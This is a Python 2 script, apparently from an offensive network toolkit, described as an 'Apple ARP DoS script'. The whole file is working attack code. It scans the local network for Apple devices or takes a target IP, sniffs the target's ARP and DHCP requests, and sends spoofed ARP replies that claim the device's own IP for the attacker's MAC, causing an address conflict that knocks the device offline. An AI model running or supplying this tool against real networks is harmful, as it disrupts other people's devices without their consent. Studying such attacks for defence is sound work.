#!/usr/bin/env python

# region Import
from sys import path
from os.path import dirname, abspath
project_root_path = dirname(dirname(dirname(abspath(__file__))))
utils_path = project_root_path + "/Utils/"
path.append(utils_path)

from base import Base
from scanner import Scanner
from network import ARP_raw
from tm import ThreadManager
from argparse import ArgumentParser
from ipaddress import IPv4Address
from scapy.all import Ether, ARP, DHCP, sniff
from socket import socket, AF_PACKET, SOCK_RAW
from time import sleep
import re
# endregion

# region Check user, platform and print banner
Base = Base()
Scanner = Scanner()
arp = ARP_raw()
Base.check_user()
Base.check_platform()
Base.print_banner()
# endregion

# region Parse script arguments
parser = ArgumentParser(description='Apple ARP DoS script')
parser.add_argument('-i', '--iface', type=str, help='Set interface name for send ARP packets')
parser.add_argument('-t', '--target_ip', type=str, help='Set target IP address', default=None)
parser.add_argument('-s', '--nmap_scan', action='store_true', help='Use nmap for Apple device detection')
args = parser.parse_args()
# endregion

# region Set global variables
apple_devices = []
apple_device = []
ip_pattern = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
target_ip = None
# endregion

# region Get listen network interface, your IP and MAC address, first and last IP in local network
if args.iface is None:
    Base.print_warning("Please set a network interface for sniffing ARP and DHCP requests ...")
listen_network_interface = Base.netiface_selection(args.iface)

your_mac_address = Base.get_netiface_mac_address(listen_network_interface)
if your_mac_address is None:
    print Base.c_error + "Network interface: " + listen_network_interface + " do not have MAC address!"
    exit(1)

your_ip_address = Base.get_netiface_ip_address(listen_network_interface)
if your_ip_address is None:
    Base.print_error("Network interface: ", listen_network_interface, " does not have IP address!")
    exit(1)

first_ip = Base.get_netiface_first_ip(listen_network_interface)
last_ip = Base.get_netiface_last_ip(listen_network_interface)
# endregion

# region Create global raw socket
socket_global = socket(AF_PACKET, SOCK_RAW)
socket_global.bind((listen_network_interface, 0))
# endregion

# region General output
Base.print_info("Listen network interface: ", listen_network_interface)
Base.print_info("Your IP address: ", your_ip_address)
Base.print_info("Your MAC address: ", your_mac_address)
Base.print_info("First ip address: ", first_ip)
Base.print_info("Last ip address: ", last_ip)
# endregion

# region Check target IP and new IP addresses
if args.target_ip is not None:
    if ip_pattern.match(args.target_ip):
        if IPv4Address(unicode(first_ip)) <= IPv4Address(unicode(args.target_ip)) <= IPv4Address(unicode(last_ip)):
            target_ip = args.target_ip
            Base.print_info("Target IP address: ", target_ip)
        else:
            Base.print_error("Target IP address: ", args.target_ip, " not in range: ", first_ip + " ... " + last_ip)
            exit(1)
    else:
        Base.print_error("Wrong target IP address: ", args.target_ip)
        exit(1)
# endregion

# ARP reply sender
def send_arp_reply():
    arp_reply = arp.make_response(ethernet_src_mac=your_mac_address,
                                  ethernet_dst_mac=apple_device[1],
                                  sender_mac=your_mac_address, sender_ip=apple_device[0],
                                  target_mac=apple_device[1], target_ip=apple_device[0])
    socket_global.send(arp_reply)
    Base.print_info("Send ARP response: ", apple_device[0], " is at ", your_mac_address)

# Analyze request in sniffer
def sniffer_prn(request):
    global apple_device

    # region ARP request
    if request.haslayer(ARP):
        if request[ARP].op == 1:
            if request[Ether].dst == "ff:ff:ff:ff:ff:ff" and request[ARP].hwdst == "00:00:00:00:00:00":
                if request[ARP].pdst == apple_device[0]:
                    Base.print_info("ARP request: Who has ", apple_device[0], " ?")
                    send_arp_reply()
    # endregion

    # region DHCP request
    if request.haslayer(DHCP):
        if request[DHCP].options[0][1] == 3:
            for option in request[DHCP].options:
                if option[0] == "requested_addr":
                    apple_device[0] = str(option[1])
                    Base.print_success("DHCP REQUEST from: ", apple_device[1], " requested ip: ", apple_device[0])
    # endregion

# Sniff ARP and DHCP request from target
def sniffer():
    Base.print_info("Waiting for ARP or DHCP REQUEST from ", apple_device[0] + " (" +apple_device[1] + ")")
    sniff(lfilter=lambda d: d.src == apple_device[1],
          filter="arp or (udp and src port 68 and dst port 67)",
          prn=sniffer_prn, iface=listen_network_interface)

if __name__ == "__main__":

    # region Find Apple devices in local network with arp-scan or nmap
    if args.target_ip is None:
        if not args.nmap_scan:
            Base.print_info("ARP scan is running ...")
            apple_devices = Scanner.find_apple_devices_by_mac(listen_network_interface)
        else:
            Base.print_info("NMAP scan is running ...")
            apple_devices = Scanner.find_apple_devices_with_nmap(listen_network_interface)

        apple_device = Scanner.apple_device_selection(apple_devices)
    # endregion

    # region Find Mac address of Apple device if target IP is set
    if args.target_ip is not None:
        Base.print_info("Find MAC address of Apple device with IP address: ", target_ip, " ...")
        target_mac = Base.get_mac(listen_network_interface, target_ip)
        if target_mac == "ff:ff:ff:ff:ff:ff":
            Base.print_error("Could not find device MAC address with IP address: ", target_ip)
            exit(1)
        else:
            apple_device = [target_ip, target_mac]
    # endregion

    # region Output target IP and MAC address
    Base.print_info("Target: ", apple_device[0] + " (" + apple_device[1] + ")")
    # endregion

    # region Start sniffer
    tm = ThreadManager(2)
    tm.add_task(sniffer)
    # endregion

    # region Send first ARP reply
    Base.print_warning("Send first (init) ARP reply ...")
    sleep(5)
    send_arp_reply()
    # endregion

    # region Wait for completion
    tm.wait_for_completion()
    # endregion
